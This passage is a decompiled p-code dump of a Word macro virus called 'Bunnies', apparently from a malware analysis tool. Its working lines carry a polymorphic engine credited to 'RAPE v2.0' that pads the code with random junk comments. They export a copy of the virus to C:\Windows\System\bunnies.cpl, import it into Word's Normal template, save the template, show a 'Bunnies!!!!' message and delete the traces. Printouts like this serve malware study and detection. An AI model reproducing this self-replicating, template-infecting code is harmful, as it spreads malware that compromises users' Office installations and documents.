' 	QuoteRem 0x0001 0x0007 "3162338"
' Line #372:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #373:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #374:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #375:
' 	QuoteRem 0x0001 0x0000 ""
' Line #376:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #377:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #378:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #379:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #380:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #381:
' 	QuoteRem 0x0001 0x0007 "1667250"
' Line #382:
' 	QuoteRem 0x0001 0x0000 ""
' Line #383:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld stuff 
' 	PrintItemNL 
' Line #384:
' 	QuoteRem 0x0001 0x0000 ""
' Line #385:
' 	QuoteRem 0x0001 0x0007 "2548050"
' Line #386:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #387:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #388:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #389:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #390:
' 	QuoteRem 0x0001 0x0000 ""
' Line #391:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #392:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #393:
' 	QuoteRem 0x0001 0x0000 ""
' Line #394:
' 	QuoteRem 0x0001 0x0006 "702978"
' Line #395:
' 	QuoteRem 0x0001 0x0000 ""
' Line #396:
' 	QuoteRem 0x0001 0x0000 ""
' Line #397:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #398:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #399:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #400:
' 	QuoteRem 0x0001 0x0007 "8814380"
' Line #401:
' 	QuoteRem 0x0001 0x0007 "2806128"
' Line #402:
' 	QuoteRem 0x0001 0x0000 ""
' Line #403:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #404:
' 	QuoteRem 0x0001 0x0007 "3779484"
' Line #405:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #406:
' 	QuoteRem 0x0001 0x0000 ""
' Line #407:
' 	QuoteRem 0x0001 0x0007 "7617791"
' Line #408:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #409:
' 	QuoteRem 0x0001 0x0000 ""
' Line #410:
' 	QuoteRem 0x0001 0x0000 ""
' Line #411:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #412:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #413:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #414:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #415:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #416:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #417:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #418:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #419:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #420:
' 	QuoteRem 0x0001 0x0007 "1116653"
' Line #421:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #422:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #423:
' 	QuoteRem 0x0001 0x0000 ""
' Line #424:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #425:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #426:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #427:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #428:
' 	QuoteRem 0x0001 0x0000 ""
' Line #429:
' 	QuoteRem 0x0001 0x0000 ""
' Line #430:
' 	QuoteRem 0x0001 0x0006 "108857"
' Line #431:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #432:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #433:
' 	QuoteRem 0x0001 0x0000 ""
' Line #434:
' 	QuoteRem 0x0001 0x0000 ""
' Line #435:
' 	QuoteRem 0x0001 0x0007 "6959961"
' Line #436:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #437:
' 	QuoteRem 0x0001 0x0000 ""
' Line #438:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #439:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #440:
' 	QuoteRem 0x0001 0x0007 "6307147"
' Line #441:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #442:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #443:
' 	QuoteRem 0x0001 0x0000 ""
' Line #444:
' 	QuoteRem 0x0001 0x0000 ""
' Line #445:
' 	QuoteRem 0x0001 0x0007 "4694725"
' Line #446:
' 	QuoteRem 0x0001 0x0000 ""
' Line #447:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #448:
' 	QuoteRem 0x0001 0x0000 ""
' Line #449:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #450:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #451:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #452:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #453:
' 	QuoteRem 0x0001 0x0007 "6501271"
' Line #454:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #455:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #456:
' 	QuoteRem 0x0001 0x0007 "1632476"
' Line #457:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #458:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #459:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #460:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #461:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #462:
' 	QuoteRem 0x0001 0x0007 "6441981"
' Line #463:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Time$ 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #464:
' 	QuoteRem 0x0001 0x0007 "6179817"
' Line #465:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #466:
' 	QuoteRem 0x0001 0x0000 ""
' Line #467:
' 	QuoteRem 0x0001 0x0007 "8979640"
' Line #468:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #469:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #470:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #471:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #472:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #473:
' 	QuoteRem 0x0001 0x0000 ""
' Line #474:
' 	QuoteRem 0x0001 0x0007 "5045025"
' Line #475:
' 	QuoteRem 0x0001 0x0000 ""
' Line #476:
' 	QuoteRem 0x0001 0x0000 ""
' Line #477:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #478:
' 	QuoteRem 0x0001 0x0007 "6310899"
' Line #479:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #480:
' 	QuoteRem 0x0001 0x0007 "7191700"
' Line #481:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #482:
' 	QuoteRem 0x0001 0x0007 "1374398"
' Line #483:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #484:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #485:
' 	QuoteRem 0x0001 0x0000 ""
' Line #486:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #487:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #488:
' 	QuoteRem 0x0001 0x0000 ""
' Line #489:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #490:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #491:
' 	QuoteRem 0x0001 0x0000 ""
' Line #492:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #493:
' 	QuoteRem 0x0001 0x0007 "2830643"
' Line #494:
' 	QuoteRem 0x0001 0x0000 ""
' Line #495:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x967F 0x0098 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #496:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #497:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #498:
' 	QuoteRem 0x0001 0x0000 ""
' Line #499:
' 	QuoteRem 0x0001 0x0000 ""
' Line #500:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #501:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #502:
' 	QuoteRem 0x0001 0x0007 "9100726"
' Line #503:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #504:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #505:
' 	QuoteRem 0x0001 0x0007 "7640149"
' Line #506:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #507:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #508:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #509:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #510:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #511:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld Z$ 
' 	PrintItemNL 
' Line #512:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #513:
' 	QuoteRem 0x0001 0x0007 "7382071"
' Line #514:
' 	QuoteRem 0x0001 0x0007 "1144921"
' Line #515:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #516:
' 	QuoteRem 0x0001 0x0007 "3803666"
' Line #517:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #518:
' 	QuoteRem 0x0001 0x0007 "7732371"
' Line #519:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #520:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #521:
' 	QuoteRem 0x0001 0x0007 "3711444"
' Line #522:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #523:
' 	QuoteRem 0x0001 0x0007 "3707428"
' Line #524:
' 	QuoteRem 0x0001 0x0007 "1271917"
' Line #525:
' 	QuoteRem 0x0001 0x0007 "6243193"
' Line #526:
' 	QuoteRem 0x0001 0x0000 ""
' Line #527:
' 	Ld stuff 
' 	LitStr 0x0005 "' EOF"
' 	Eq 
' 	LoopUntil 
' Line #528:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #529:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #530:
' 	QuoteRem 0x0001 0x0000 ""
' Line #531:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #532:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #533:
' 	QuoteRem 0x0001 0x0000 ""
' Line #534:
' 	QuoteRem 0x0001 0x0000 ""
' Line #535:
' 	QuoteRem 0x0001 0x0007 "7384228"
' Line #536:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #537:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #538:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #539:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #540:
' 	QuoteRem 0x0001 0x0000 ""
' Line #541:
' 	QuoteRem 0x0001 0x0007 "1437773"
' Line #542:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #543:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #544:
' 	QuoteRem 0x0001 0x0000 ""
' Line #545:
' 	QuoteRem 0x0001 0x0000 ""
' Line #546:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #547:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #548:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #549:
' 	QuoteRem 0x0001 0x0000 ""
' Line #550:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #551:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #552:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #553:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #554:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #555:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #556:
' 	QuoteRem 0x0001 0x0000 ""
' Line #557:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #558:
' 	QuoteRem 0x0001 0x0007 "2849319"
' Line #559:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #560:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #561:
' 	QuoteRem 0x0001 0x0000 ""
' Line #562:
' 	QuoteRem 0x0001 0x0000 ""
' Line #563:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #564:
' 	QuoteRem 0x0001 0x0007 "7912817"
' Line #565:
' 	QuoteRem 0x0001 0x0007 "1222553"
' Line #566:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #567:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #568:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #569:
' 	QuoteRem 0x0001 0x0000 ""
' Line #570:
' 	QuoteRem 0x0001 0x0000 ""
' Line #571:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #572:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #573:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #574:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #575:
' 	QuoteRem 0x0000 0x004C " Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error"
' Line #576:
' 	QuoteRem 0x0001 0x0007 "9305687"
' Line #577:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #578:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #579:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #580:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #581:
' 	QuoteRem 0x0001 0x0000 ""
' Line #582:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #583:
' 	QuoteRem 0x0001 0x0000 ""
' Line #584:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #585:
' 	QuoteRem 0x0001 0x0007 "8817799"
' Line #586:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #587:
' 	QuoteRem 0x0001 0x0000 ""
' Line #588:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #589:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #590:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #591:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	ArgsCall Kill 0x0001 
' Line #592:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #593:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #594:
' 	QuoteRem 0x0001 0x0006 "600164"
' Line #595:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #596:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #597:
' 	QuoteRem 0x0001 0x0007 "5151258"
' Line #598:
' 	QuoteRem 0x0001 0x0006 "342086"
' Line #599:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #600:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #601:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #602:
' 	QuoteRem 0x0001 0x0007 "6671458"
' Line #603:
' 	QuoteRem 0x0001 0x0007 "1433757"
' Line #604:
' 	QuoteRem 0x0001 0x0007 "9203207"
' Line #605:
' 	QuoteRem 0x0001 0x0000 ""
' Line #606:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #607:
' 	Dim 
' 	VarDefn OldName
' Line #608:
' 	QuoteRem 0x0001 0x0000 ""
' Line #609:
' 	QuoteRem 0x0001 0x0000 ""
' Line #610:
' 	QuoteRem 0x0001 0x0007 "7060618"
' Line #611:
' 	QuoteRem 0x0001 0x0007 "2441554"
' Line #612:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #613:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #614:
' 	QuoteRem 0x0001 0x0000 ""
' Line #615:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #616:
' 	QuoteRem 0x0001 0x0000 ""
' Line #617:
' 	QuoteRem 0x0001 0x0000 ""
' Line #618:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #619:
' 	QuoteRem 0x0001 0x0000 ""
' Line #620:
' 	QuoteRem 0x0001 0x0007 "1607960"
' Line #621:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #622:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #623:
' 	Dim 
' 	VarDefn NewName
' Line #624:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #625:
' 	QuoteRem 0x0001 0x0007 "6802207"
' Line #626:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #627:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #628:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #629:
' 	QuoteRem 0x0001 0x0007 "9333955"
' Line #630:
' 	QuoteRem 0x0001 0x0006 "473168"
' Line #631:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #632:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #633:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #634:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #635:
' 	QuoteRem 0x0001 0x0000 ""
' Line #636:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #637:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #638:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #639:
' 	LitStr 0x001D "C:\Windows\System\bunnies.cpl"
' 	St OldName 
' 	BoS 0x0000 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	St NewName 
' Line #640:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #641:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #642:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #643:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #644:
' 	QuoteRem 0x0001 0x0007 "9076211"
' Line #645:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #646:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #647:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #648:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #649:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #650:
' 	QuoteRem 0x0001 0x0000 ""
' Line #651:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #652:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #653:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #654:
' 	QuoteRem 0x0001 0x0007 "9762221"
' Line #655:
' 	Ld OldName 
' 	Ld NewName 
' 	Name 
' Line #656:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #657:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #658:
' 	QuoteRem 0x0001 0x0006 "901100"
' Line #659:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #660:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #661:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #662:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #663:
' 	QuoteRem 0x0001 0x0000 ""
' Line #664:
' 	QuoteRem 0x0001 0x0000 ""
' Line #665:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #666:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #667:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #668:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #669:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #670:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #671:
' 	StartWithExpr 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #672:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #673:
' 	QuoteRem 0x0001 0x0000 ""
' Line #674:
' 	QuoteRem 0x0001 0x0007 "4698723"
' Line #675:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #676:
' 	QuoteRem 0x0001 0x0000 ""
' Line #677:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #678:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #679:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #680:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #681:
' 	QuoteRem 0x0001 0x0000 ""
' Line #682:
' 	QuoteRem 0x0001 0x0000 ""
' Line #683:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #684:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #685:
' 	QuoteRem 0x0001 0x0007 "5950008"
' Line #686:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #687:
' 	EndWith 
' Line #688:
' 	QuoteRem 0x0001 0x0000 ""
' Line #689:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #690:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #691:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #692:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #693:
' 	QuoteRem 0x0001 0x0007 "3549341"
' Line #694:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #695:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #696:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #697:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #698:
' 	QuoteRem 0x0001 0x0000 ""
' Line #699:
' 	QuoteRem 0x0001 0x0007 "8045723"
' Line #700:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #701:
' 	QuoteRem 0x0001 0x0007 "4942211"
' Line #702:
' 	QuoteRem 0x0001 0x0000 ""
' Line #703:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #704:
' 	QuoteRem 0x0001 0x0007 "2064494"
' Line #705:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #706:
' 	QuoteRem 0x0001 0x0007 "6120195"
' Line #707:
' 	QuoteRem 0x0001 0x0000 ""
' Line #708:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #709:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #710:
' 	QuoteRem 0x0001 0x0000 ""
' Line #711:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #712:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #713:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #714:
' 	QuoteRem 0x0001 0x0000 ""
' Line #715:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #716:
' 	QuoteRem 0x0001 0x0000 ""
' Line #717:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #718:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #719:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #720:
' 	QuoteRem 0x0001 0x0000 ""
' Line #721:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #722:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #723:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #724:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #725:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #726:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #727:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #728:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #729:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #730:
' 	QuoteRem 0x0001 0x0007 "9663826"
' Line #731:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #732:
' 	QuoteRem 0x0001 0x0007 "2322572"
' Line #733:
' 	QuoteRem 0x0001 0x0000 ""
' Line #734:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #735:
' 	LitStr 0x000B "Bunnies!!!!"
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' Line #736:
' 	QuoteRem 0x0001 0x0007 "5604039"
' Line #737:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #738:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #739:
' 	QuoteRem 0x0001 0x0000 ""
' Line #740:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #741:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #742:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #743:
' 	QuoteRem 0x0001 0x0000 ""
' Line #744:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #745:
' 	QuoteRem 0x0001 0x0000 ""
' Line #746:
' 	QuoteRem 0x0001 0x0000 ""
' Line #747:
' 	QuoteRem 0x0001 0x0000 ""
' Line #748:
' 	QuoteRem 0x0001 0x0006 "282463"
' Line #749:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #750:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #751:
' 	LitStr 0x001D "C:\Windows\System\Bunnies.cpl"
' 	ArgsCall Kill 0x0001 
' Line #752:
' 	QuoteRem 0x0001 0x0000 ""
' Line #753:
' 	QuoteRem 0x0001 0x0007 "6027973"
' Line #754:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #755:
' 	QuoteRem 0x0001 0x0007 "6648766"
' Line #756:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #757:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #758:
' 	QuoteRem 0x0001 0x0007 "6480753"
' Line #759:
' 	QuoteRem 0x0001 0x0007 "5110557"
' Line #760:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #761:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #762:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #763:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #764:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #765:
' 	QuoteRem 0x0001 0x0007 "1091471"
' Line #766:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #767:
' 	LitStr 0x0017 "C:\Windows\System\B.cpl"
' 	ArgsCall Kill 0x0001 
' Line #768:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #769:
' 	QuoteRem 0x0001 0x0006 "448319"
' Line #770:
' 	QuoteRem 0x0001 0x0007 "6095679"
' Line #771:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #772:
' 	QuoteRem 0x0001 0x0000 ""
' Line #773:
' 	QuoteRem 0x0001 0x0007 "3107064"
' Line #774:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #775:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #776:
' 	QuoteRem 0x0001 0x0000 ""
' Line #777:
' 	QuoteRem 0x0001 0x0007 "7035769"
' Line #778:
' 	QuoteRem 0x0001 0x0007 "2687216"
' Line #779:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #780:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #781:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #782:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #783:
' 	EndFunc 
' Line #784:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #785:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #786:
' 	QuoteRem 0x0001 0x0000 ""
' Line #787:
' 	QuoteRem 0x0001 0x0006 "319395"
' Line #788:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #789:
' 	QuoteRem 0x0001 0x0006 "575315"
' Line #790:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #791:
' 	QuoteRem 0x0001 0x0007 "9915977"
' Line #792:
' 	QuoteRem 0x0001 0x0000 ""
' Line #793:
' 	QuoteRem 0x0001 0x0000 ""
' Line #794:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #795:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #796:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #797:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #798:
' 	QuoteRem 0x0001 0x0000 ""
' Line #799:
' 	QuoteRem 0x0000 0x0004 " EOF"
' Line #800:
' 	QuoteRem 0x0001 0x0001 "T"
' Macros/VBA/BunniesB4 - 51106 bytes
' Line #0:
' 	QuoteRem 0x0001 0x0007 "2393365"
' Line #1:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #2:
' 	QuoteRem 0x0001 0x0000 ""
' Line #3:
